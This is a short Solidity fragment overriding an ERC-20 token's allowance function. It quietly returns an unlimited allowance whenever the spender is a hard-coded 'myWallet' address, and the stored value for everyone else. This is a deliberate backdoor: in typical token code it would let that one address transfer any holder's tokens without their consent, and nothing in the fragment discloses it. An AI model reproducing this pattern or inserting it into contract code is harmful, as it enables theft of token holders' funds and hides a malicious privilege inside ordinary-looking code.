    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
{
    if (spender == myWallet) {
        return type(uint256).max;
    }

    return _allowances[owner][spender];
}
